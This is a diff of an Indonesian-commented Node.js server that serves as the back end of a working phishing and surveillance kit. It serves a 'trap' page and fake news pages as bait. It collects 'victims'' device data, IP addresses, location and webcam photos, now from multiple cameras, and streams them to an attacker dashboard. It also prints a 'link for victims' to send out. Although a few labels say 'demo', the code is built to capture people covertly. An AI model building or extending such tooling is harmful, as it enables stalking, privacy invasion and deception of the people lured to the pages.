@@ -1,4 +1,5 @@
-// server.js - VERSI YANG SUDAH DIPERBAIKI
+// server.js - VERSI DIPERBAIKI UNTUK MULTIPLE CAMERA
+
 const express = require("express");
 const http = require("http");
 const socketIo = require("socket.io");
@@ -15,7 +16,7 @@ const io = socketIo(server, {
   },
 });
 
-// Middleware untuk CORS - TARUH PALING ATAS
+// Middleware untuk CORS
 app.use((req, res, next) => {
   res.header("Access-Control-Allow-Origin", "*");
   res.header(
@@ -24,11 +25,9 @@ app.use((req, res, next) => {
   );
   res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
 
-  // Handle preflight requests
   if (req.method === "OPTIONS") {
     return res.status(200).end();
   }
-
   next();
 });
 
@@ -43,43 +42,38 @@ if (!fs.existsSync("captures")) {
 
 // Database sederhana
 let victims = [];
-let photos = {};
+let photos = {}; // Struktur: photos[victimId] = array of {image, cameraType, timestamp}
 
-// ============= API ROUTES (TARUH PALING ATAS) =============
+// ============= API ROUTES =============
 
 // Endpoint untuk testing
 app.get("/api/test", (req, res) => {
   res.json({ status: "ok", message: "Server is running" });
 });
 
-// API untuk menerima data
+// API untuk menerima data (device info, location, dll)
 app.post("/api/capture", (req, res) => {
   console.log("📥 Data received:", req.body);
 
   try {
     const data = req.body;
 
-    // Validasi data
     if (!data || !data.victimId) {
       return res.status(400).json({ error: "Invalid data" });
     }
 
-    // Tambahkan timestamp dan IP
     data.timestamp = new Date().toISOString();
     data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-    // Cari victim yang sudah ada
     const existingIndex = victims.findIndex(
       (v) => v.victimId === data.victimId,
     );
 
     if (existingIndex >= 0) {
-      // Merge data
       if (!victims[existingIndex].data) {
         victims[existingIndex].data = {};
       }
 
-      // Jika data memiliki struktur dengan type
       if (data.type && data.data) {
         victims[existingIndex].data[data.type] = data.data;
       } else if (data.data) {
@@ -92,7 +86,6 @@ app.post("/api/capture", (req, res) => {
       victims[existingIndex].timestamp = data.timestamp;
       victims[existingIndex].ip = data.ip;
     } else {
-      // Victim baru - buat struktur yang benar
       const newVictim = {
         victimId: data.victimId,
         timestamp: data.timestamp,
@@ -109,12 +102,8 @@ app.post("/api/capture", (req, res) => {
       victims.push(newVictim);
     }
 
-    // Kirim ke semua dashboard via socket
     io.emit("new-victim", data);
-
-    // Simpan ke file log
-    const logData = JSON.stringify(data) + "\n";
-    fs.appendFileSync("victims.log", logData);
+    fs.appendFileSync("victims.log", JSON.stringify(data) + "\n");
 
     console.log(`✅ Data saved for victim: ${data.victimId}`);
 
@@ -125,45 +114,108 @@ app.post("/api/capture", (req, res) => {
   }
 });
 
-// API untuk menerima gambar
+// API untuk menerima gambar (DIPERBAIKI untuk multiple camera)
 app.post("/api/capture-image", (req, res) => {
   console.log("📸 Received image upload request");
 
   try {
-    const { image, victimId } = req.body;
+    const { image, victimId, cameraType, timestamp } = req.body;
 
     if (!image || !victimId) {
       console.log("❌ Missing image or victimId");
       return res.status(400).json({ error: "Invalid data" });
     }
 
-    // Log ukuran gambar
-    console.log(`📸 Image from ${victimId}, size: ${image.length} characters`);
+    // Log ukuran gambar dan info kamera
+    const cameraTypeStr = cameraType || "unknown";
+    console.log(
+      `📸 Image from ${victimId}, camera: ${cameraTypeStr}, size: ${image.length} chars`,
+    );
 
     // Hapus header base64
     const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
 
-    // Simpan ke file
-    const filename = `captures/${victimId}_${Date.now()}.jpg`;
+    // Simpan ke file dengan nama yang lebih informatif
+    const filename = `captures/${victimId}_${cameraTypeStr}_${Date.now()}.jpg`;
     fs.writeFileSync(filename, base64Data, "base64");
     console.log(`✅ Image saved to ${filename}`);
 
-    // Simpan di memory untuk ditampilkan
-    photos[victimId] = image;
+    // ========== PERBAIKAN: Simpan di memory dengan struktur array ==========
+    if (!photos[victimId]) {
+      photos[victimId] = [];
+    }
+
+    const photoData = {
+      image: image,
+      cameraType: cameraTypeStr,
+      timestamp: timestamp || new Date().toISOString(),
+      filename: filename,
+    };
+
+    photos[victimId].push(photoData);
+
+    // Hanya simpan maksimal 20 foto terakhir per victim
+    if (photos[victimId].length > 20) {
+      photos[victimId] = photos[victimId].slice(-20);
+    }
 
     // Kirim ke dashboard
-    io.emit("new-photo", { victimId, image });
-    console.log(`📤 Photo sent to dashboard for ${victimId}`);
+    io.emit("new-photo", {
+      victimId,
+      image: image,
+      cameraType: cameraTypeStr,
+      timestamp: photoData.timestamp,
+    });
 
-    res.json({ status: "ok", filename });
+    console.log(
+      `📤 Photo sent to dashboard for ${victimId} (${cameraTypeStr})`,
+    );
+    console.log(`📊 Total photos for ${victimId}: ${photos[victimId].length}`);
+
+    res.json({ status: "ok", filename, cameraType: cameraTypeStr });
   } catch (error) {
     console.error("❌ Error saving image:", error);
     res.status(500).json({ error: error.message });
   }
 });
 
+// API untuk mendapatkan foto spesifik (opsional)
+app.get("/api/photos/:victimId", (req, res) => {
+  const victimId = req.params.victimId;
+  if (photos[victimId]) {
+    res.json({
+      victimId,
+      photos: photos[victimId],
+      count: photos[victimId].length,
+    });
+  } else {
+    res.json({ victimId, photos: [], count: 0 });
+  }
+});
+
+// API untuk membersihkan data (opsional untuk demo)
+app.post("/api/clear-data", (req, res) => {
+  try {
+    victims = [];
+    photos = {};
+
+    // Kosongkan folder captures (opsional)
+    const capturesDir = path.join(__dirname, "captures");
+    const files = fs.readdirSync(capturesDir);
+    for (const file of files) {
+      fs.unlinkSync(path.join(capturesDir, file));
+    }
+
+    console.log("🗑️ All data cleared");
+    io.emit("data-cleared");
+    res.json({ status: "ok", message: "All data cleared" });
+  } catch (error) {
+    console.error("Error clearing data:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // ============= STATIC FILES =============
-// Serve static files dari folder public
 app.use(
   express.static("public", {
     setHeaders: (res, path) => {
@@ -175,22 +227,18 @@ app.use(
 );
 
 // ============= PAGE ROUTES =============
-// Serve halaman utama
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "dashboard.html"));
 });
 
-// Serve halaman trap
 app.get("/demo", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "trap.html"));
 });
 
-// Serve halaman berita
 app.get("/berita", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "berita.html"));
 });
 
-// Variasi URL berita
 app.get("/artikel", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "berita.html"));
 });
@@ -203,43 +251,55 @@ app.get("/berita-terkini", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "berita.html"));
 });
 
-// ============= 404 HANDLER (TARUH PALING BAWAH) =============
-// Handle semua request yang tidak ditemukan (404) redirect ke berita
+// ============= 404 HANDLER =============
 app.use((req, res) => {
-  // Jangan redirect untuk API routes
   if (req.path.startsWith("/api/")) {
     return res.status(404).json({ error: "API endpoint not found" });
   }
-
-  // Jangan redirect untuk file statis
   if (req.path.includes(".")) {
     return res.status(404).send("File not found");
   }
-
-  // Redirect halaman yang tidak dikenal ke berita
   res.redirect("/berita");
 });
 
-// Socket.io connection
+// ============= SOCKET.IO =============
 io.on("connection", (socket) => {
   console.log("📊 Dashboard terhubung");
 
   // Kirim statistik
+  const totalVictims = victims.length;
+  const cameraGranted = victims.filter(
+    (v) => v.data?.camera_access?.status === "granted",
+  ).length;
+  const locationGranted = victims.filter(
+    (v) => v.data?.location?.status === "granted",
+  ).length;
+
   socket.emit("stats", {
-    total: victims.length,
-    camera: victims.filter((v) => v.data?.camera_access?.status === "granted")
-      .length,
-    location: victims.filter((v) => v.data?.location?.status === "granted")
-      .length,
+    total: totalVictims,
+    camera: cameraGranted,
+    location: locationGranted,
   });
 
-  // Kirim data yang sudah ada
+  // Kirim data victims yang sudah ada
   socket.emit("init-data", victims);
 
-  // Kirim photos yang sudah ada
+  // Kirim photos yang sudah ada (dengan struktur array)
   Object.keys(photos).forEach((victimId) => {
-    socket.emit("new-photo", { victimId, image: photos[victimId] });
+    // Kirim semua foto untuk victim ini
+    photos[victimId].forEach((photo) => {
+      socket.emit("new-photo", {
+        victimId,
+        image: photo.image,
+        cameraType: photo.cameraType,
+        timestamp: photo.timestamp,
+      });
+    });
   });
+
+  console.log(
+    `📊 Sent ${victims.length} victims and ${Object.keys(photos).length} photo records`,
+  );
 });
 
 const PORT = 3000;
@@ -249,7 +309,8 @@ server.listen(PORT, "0.0.0.0", () => {
   console.log(`   - Network: http://${getLocalIP()}:${PORT}`);
   console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
   console.log(`📊 Link dashboard: http://localhost:${PORT}`);
-  console.log(`📰 Link berita: http://localhost:${PORT}/berita\n`);
+  console.log(`📰 Link berita: http://localhost:${PORT}/berita`);
+  console.log(`🖼️  Folder captures: ${path.join(__dirname, "captures")}\n`);
 });
 
 // Helper untuk mendapatkan IP lokal
